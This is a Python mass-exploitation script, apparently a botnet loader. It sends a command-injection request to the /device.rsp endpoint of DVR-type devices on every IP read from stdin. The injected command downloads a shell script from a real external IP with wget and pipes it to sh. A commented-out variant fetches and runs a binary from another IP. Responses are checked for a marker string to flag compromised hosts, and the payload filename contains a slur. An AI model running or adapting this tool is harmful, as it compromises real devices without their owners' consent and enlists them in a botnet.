import socket
import threading
import sys
import time
from concurrent.futures import ThreadPoolExecutor

# Global variables
#payload = "cd+/tmp;rm+-f+*;wget+http://141.98.11.136/y;chmod+777+y;./y+dvr"
payload = "cd+/tmp;wget+http://198.98.59.103/GODLYBINSNIGGAYOUCANTCRACKTHESEBITCH11111222268.sh+-O-+|sh"
timeout = 5  # Connection timeout in seconds
processed_count = 0  # Shared counter for processed targets
lock = threading.Lock()  # Lock for thread-safe counter increment

# Function to send payload to the target
def send_payload(target):
    global processed_count
    ip = target.split(":")[0]  # Extract IP if port is provided

    try:
        # Create TCP connection
        conn = socket.create_connection((target, 80), timeout=timeout)
        request = (
            f"GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc={payload} "
            f"HTTP/1.1\r\nHost: {target}\r\nCookie: uid=1\r\nConnection: close\r\n"
            f"Referer: http:// /login.rsp\r\nUser-Agent: curl/7.68.0\r\n\r\n"
        )
        conn.sendall(request.encode())

        # Receive response in chunks and search for "zenci"
        while True:
            data = conn.recv(4096)
            if not data:
                break
            # Check if "zenci" is in the current data chunk
            if b'zenci' in data:
                print(f"found one {ip}")
                break  # Stop receiving once "zenci" is found

        conn.close()

    except socket.timeout:
        pass  # Handle timeout errors
    except Exception as e:
#        print(f"Error sending payload to {target}: {e}")
        pass
    # Increment processed count safely
    with lock:
        processed_count += 1

# Function to load bot on a specific target
def load_bot(target):
    send_payload(target)

# Function to print processed count every second
def print_processed_count():
    while True:
        time.sleep(1)  # Wait for one second
        with lock:
            print(f"Processed targets: {processed_count}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <port> or 'listen'")
        sys.exit(1)

    mode = sys.argv[1]
    threads = []

    # Start the thread to print processed count
    count_thread = threading.Thread(target=print_processed_count, daemon=True)
    count_thread.start()

    # Read targets from stdin and process each IP
    for ip in sys.stdin:
        ip = ip.strip()
        if ip:  # If IP is not empty
            # Create and start a thread for each IP
            thread = threading.Thread(target=load_bot, args=(ip if mode == "listen" else f"{ip}:{mode}",))
            threads.append(thread)
            thread.start()

    # Wait for all threads to finish processing
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()

